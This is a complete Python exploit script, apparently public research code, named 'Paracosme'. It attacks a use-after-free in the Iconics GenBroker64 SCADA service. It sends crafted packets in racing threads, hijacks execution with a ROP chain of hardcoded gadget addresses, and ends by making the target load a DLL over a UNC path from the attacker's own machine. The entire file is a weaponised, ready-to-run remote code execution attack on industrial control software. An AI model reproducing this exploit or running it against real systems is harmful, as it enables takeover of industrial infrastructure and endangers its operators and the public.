# Axel '0vercl0k' Souchet - December 18 2020
import threading
import socket
import ctypes
import struct
import argparse


def p8(b):
    return struct.pack("<B", b)


def p16(w):
    return struct.pack("<H", w)


def p32(u):
    return struct.pack("<I", u)


def p64(q):
    return struct.pack("<Q", q)


class Header_t(ctypes.BigEndianStructure):
    _fields_ = [
        ("Version", ctypes.c_uint16),
        ("Level", ctypes.c_uint16),
        ("SenderID", ctypes.c_uint32),
        ("Length", ctypes.c_uint32),
    ]


assert ctypes.sizeof(Header_t) == 0xC


class PayloadHeader_t(ctypes.LittleEndianStructure):
    _fields_ = [
        ("Field0", ctypes.c_uint32),
        ("Field1", ctypes.c_uint32),
        ("Type", ctypes.c_uint32),
    ]


assert ctypes.sizeof(PayloadHeader_t) == 0xC


def build_unicode_str(content):
    uni_content = content.encode("utf-16")[2:]
    return (
        p8(0xFF)
        + p16(0xFFFE)
        + p8(0xFF)
        + p16(0xFFFF)
        + p32(0xFFFFFFFF)
        + p64(len(content))
        + uni_content
    )


def build_packet(lvl, content):
    header = Header_t(Version=0xDEAD, Level=lvl, SenderID=1, Length=len(content))
    return bytes(header) + bytes(content)


def handshake(s):
    payload_header = PayloadHeader_t(Field0=0x1111, Field1=0x2222)
    payload_header.Type = 0xBB8
    p = build_unicode_str("hello")
    payload = bytes(payload_header) + p
    bb8 = build_packet(1, payload)

    payload_header.Type = 0xBBA
    p = build_unicode_str("doar-e.github.io")
    payload = bytes(payload_header) + p
    bba = build_packet(1, payload)

    payload_header.Type = 0xBBC
    p = p32(0xDEADBEEF)
    payload = bytes(payload_header) + p
    bbc = build_packet(1, payload)
    for pkt in (bb8, bba, bbc):
        s.send(pkt)
        r = s.recv(128)
        # print("Received handshake:", r)


def build_vtunknown(clsid):
    datas = clsid.split("-")
    assert len(datas) == 5
    p = b""
    VT_UNKNOWN = 13
    p += p16(VT_UNKNOWN)
    p += p32(int(datas[0], 16))
    p += p16(int(datas[1], 16))
    p += p16(int(datas[2], 16))
    p += bytes.fromhex(datas[3])
    p += bytes.fromhex(datas[4])
    return p


class TriggerThread_t(threading.Thread):
    def __init__(self, args):
        threading.Thread.__init__(self, name="trigger")
        self.target = (args.target, args.port)
        self.tries = args.tries
        self.handshake_done_event = threading.Event()
        self.trigger_event = threading.Event()

    def wait_for_handshake(self):
        self.handshake_done_event.wait()
        self.handshake_done_event.clear()

    def trigger(self):
        self.trigger_event.set()

    def run(self):
        try:
            self.run_()
        except ConnectionResetError:
            pass

    def run_(self):
        payload_header = PayloadHeader_t(Field0=0x1111, Field1=0x2222, Type=0x3F0)
        p = b""
        p += p32(0x11111111)
        p += p32(0x22222222)
        p += p32(0x33333333)
        p += build_unicode_str("PoC")
        p += p32(1)
        p += build_unicode_str("doar-e ftw!")
        p += p16(0)
        p += build_vtunknown("00000303-0000-0000-C000-000000000046")
        payload = bytes(payload_header) + p
        _3f0 = build_packet(4, payload)
        for _ in range(self.tries):
            s = socket.create_connection(self.target)
            handshake(s)
            self.handshake_done_event.set()
            self.trigger_event.wait()
            self.trigger_event.clear()
            s.send(_3f0)
            s.close()


class RacerThread_t(threading.Thread):
    def __init__(self, args):
        super().__init__(name="racer")
        self.tries = args.tries
        self.target = (args.target, args.port)
        self.payload_ip = args.payload_ip
        self.handshake_done_event = threading.Event()
        self.trigger_event = threading.Event()

    def wait_for_handshake(self):
        self.handshake_done_event.wait()
        self.handshake_done_event.clear()

    def trigger(self):
        self.trigger_event.set()

    def run(self):
        try:
            self.run_()
        except ConnectionResetError:
            pass

    def run_(self):
        # This is the size of the use-after-free'd object we need to reclaim.
        #   0:000> !ext.heap -p -a 0x00000132`1094df40
        #     address 000001321094df40 found in
        #     _DPH_HEAP_ROOT @ 1320ffc1000
        #     in busy allocation (  DPH_HEAP_BLOCK:  UserAddr     UserSize)
        #                              1320ffdf820: 1321094df40     c0
        #     ole32!CFileMoniker::`vftable'
        #     ntdll!RtlDebugAllocateHeap+0x0000000000000048
        #     ntdll!RtlpAllocateHeap+0x0000000000092780
        #     ntdll!RtlpAllocateHeapInternal+0x00000000000006ac
        #     ole32!CFileMoniker::Create+0x0000000000000034
        #     ole32!CFileMonikerFactory::CreateInstance+0x000000000000004d
        #     combase!ICoCreateInstanceEx+0x0000000000000669
        #     combase!CComActivator::DoCreateInstance+0x0000000000000175
        #     combase!CoCreateInstance+0x000000000000010c
        reclaim_size = 0xC0
        payload_header = PayloadHeader_t(Field0=0x1111, Field1=0x2222, Type=0x7D0)
        p = b""
        p += build_unicode_str("a")
        p += build_unicode_str("a")
        p += build_unicode_str("a")
        p += p32(0x1)
        left = reclaim_size
        p += p32(left // 4)
        # This is where we hijack RIP from the virtual Release call:
        #   OLEAUT32!VariantClear+0x20b:
        #   00007ffb`0df751cb mov rax,qword ptr [rcx] ds:00000000`2fb19f40=????????????????
        #   0:011> u . l3
        #   OLEAUT32!VariantClear+0x20b:
        #   00007ffb`0df751cb  mov     rax,qword ptr [rcx]
        #   00007ffb`0df751ce  mov     rax,qword ptr [rax+10h]
        #   00007ffb`0df751d2  call    qword ptr [00007ffb`0df82660]
        #   0:011> u poi(00007ffb`0df82660)
        #   OLEAUT32!SetErrorInfo+0xec0:
        #   00007ffb`0deffd40  jmp     rax
        #
        # The following gadget gets us *unconstrained* arbitrary call; this is the start of the reclaim buffer that'll be pointed by @rcx:
        #   0:011> u poi(1400aed18)
        #   00007ffb2137ffe0   sub     rsp,38h
        #   00007ffb2137ffe4   test    rcx,rcx
        #   00007ffb2137ffe7   je      00007ffb`21380015
        #   00007ffb2137ffe9   cmp     qword ptr [rcx+10h],0
        #   00007ffb2137ffee   jne     00007ffb`2137fff4
        #   ...
        #   00007ffb2137fff4   and     qword ptr [rsp+40h],0
        #   00007ffb2137fffa   mov     rax,qword ptr [rcx+10h]
        #   00007ffb2137fffe   call    qword ptr [mfc140u!__guard_dispatch_icall_fptr (00007ffb`21415b60)]
        unconstrained_call_gadget_ptr_addr = 0x1400AED18
        p += p64(unconstrained_call_gadget_ptr_addr - 0x10)
        left -= 8
        p += p64(0xBBBBBBBBBBBBBBBB)
        left -= 8
        # Then, the following gadget pivots the stack to the heap chunk
        # under our control that is pointed by @ecx:
        #   0:008> u 14005bd25
        #   000000014005bd25   mov     esp,ecx
        #   000000014005bd27   cmp     byte ptr [1400fe788],0
        #   000000014005bd2e   je      000000014005bebc
        #   ...
        #   000000014005bebc   lea     r11,[rsp+60h]
        #   000000014005bec1   mov     rbx,qword ptr [r11+30h]
        #   000000014005bec5   mov     rbp,qword ptr [r11+38h]
        #   000000014005bec9   mov     rsi,qword ptr [r11+40h]
        #   000000014005becd   mov     rsp,r11
        #   000000014005bed0   pop     r15
        #   000000014005bed2   pop     r14
        #   000000014005bed4   pop     r13
        #   000000014005bed6   pop     r12
        #   000000014005bed8   pop     rdi
        #   000000014005bed9   ret
        # Note that this works fine because in all my tests, the stack pointer
        # entirely fit into a 32-bit register, otherwise it would break us ＞﹏＜.
        heap_pivot_gadget_addr = 0x14005BD25
        p += p64(heap_pivot_gadget_addr)
        left -= 8

        p += p64(0x11111111_11111111)
        left -= 8
        p += p64(0x22222222_22222222)
        left -= 8
        p += p64(0x33333333_33333333)
        left -= 8
        s = bytes(f"\\\\{self.payload_ip}\\x\\a.dll\x00", "utf-16")[2:]
        assert len(s) <= 56
        p += s
        p += b"x" * (56 - len(s))
        left -= 56

        # The below QWORD is the value popped by the 'pop r14' from the above gadget,
        # and its value points at &LoadLibraryW from the IAT. Execution flow will be
        # transfered there at the end of the ROP chain.
        #   0:011> dqs 0x1400ae418 l1
        #   00000001`400ae418  00007ffb`0d95fee0 KERNEL32!LoadLibraryW
        loadlibraryw_ptr_addr = 0x1400AE418
        p += p64(loadlibraryw_ptr_addr - 0x8)
        left -= 8
        p += p64(0x77777777_77777777)
        left -= 8
        p += p64(0x88888888_88888888)
        left -= 8
        p += p64(0x99999999_99999999)
        left -= 8

        # Set @rbp to an address that points to the value 0x30. This is used
        # to adjust the @rcx pointer to the remote dll path from above.
        #   0x1400022dc: pop rbp ; ret  ;  (717 found)
        pop_rbp_gadget_addr = 0x1400022DC
        #   > rp-win-x64.exe --file GenBroker64.exe --search-hexa=\x30\x00\x00\x00
        #   0x1400a2223: 0\x00\x00\x00
        _0x30_ptr_addr = 0x1400A2223
        p += p64(pop_rbp_gadget_addr)
        p += p64(_0x30_ptr_addr + 0x75)
        left -= 8 * 2

        # Adjust the @rcx pointer to point to the remote dll path using the
        # 0x30 pointer loaded in @rbp from above.
        #   0x14000e898: add ecx, dword [rbp-0x75] ; ret  ;  (1 found)
        add_ecx_gadget_addr = 0x14000E898
        p += p64(add_ecx_gadget_addr)
        left -= 8

        # Set @rbp to a pointer into GenClient64's .data section. This is where
        # we'll pivot the stack before returning to LoadLibraryW at the end of the chain.
        #   0:011> !dh -a genclient64
        #   SECTION HEADER #3
        #      .data name
        #       6C80 virtual size
        #     12B000 virtual address
        #   C0000040 flags
        #            Read Write
        genclient64_data_section_addr = 0x180131D88
        p += p64(pop_rbp_gadget_addr)
        p += p64(genclient64_data_section_addr)
        left -= 8 * 2

        # Pivot the stack into GenClient64's .data section and return to LoadLibraryW
        # to load our payload!
        #   0x140004e18: leave (mov rsp, rbp ; pop rbp) ; call qword [r14+0x08] ;  (1 found)
        data_pivot_gadget_addr = 0x140004E18
        p += p64(data_pivot_gadget_addr)
        left -= 8

        # If there are any bytes left, let's pad the buffer to make sure it has the exact right size.
        assert left >= 0
        p += b"z" * left

        # Build the payload and the final packet.
        payload = bytes(payload_header) + p
        _7d0 = build_packet(4, payload)
        for _ in range(self.tries):
            s = socket.create_connection(self.target)
            handshake(s)
            self.handshake_done_event.set()
            self.trigger_event.wait()
            self.trigger_event.clear()
            s.send(_7d0)
            s.close()


def main():
    parser = argparse.ArgumentParser(
        "Paracosme - Iconics GenBroker64 use-after-free remote exploit by Axel '0vercl0k' Souchet"
    )
    parser.add_argument("--target", required=True)
    parser.add_argument("--port", default=38080)
    parser.add_argument("--tries", default=10_000)
    args = parser.parse_args()

    # Grabbing the local ip.
    s = socket.create_connection((args.target, args.port))
    args.payload_ip, _ = s.getsockname()
    s.close()

    racer = RacerThread_t(args)
    trigger = TriggerThread_t(args)
    threads = (racer, trigger)
    for thread in threads:
        thread.start()

    print("Firing on all cylinders..")
    for _ in range(args.tries):
        racer.wait_for_handshake()
        trigger.wait_for_handshake()
        racer.trigger()
        trigger.trigger()

    for thread in threads:
        thread.join()

    print("Done!")


if __name__ == "__main__":
    main()
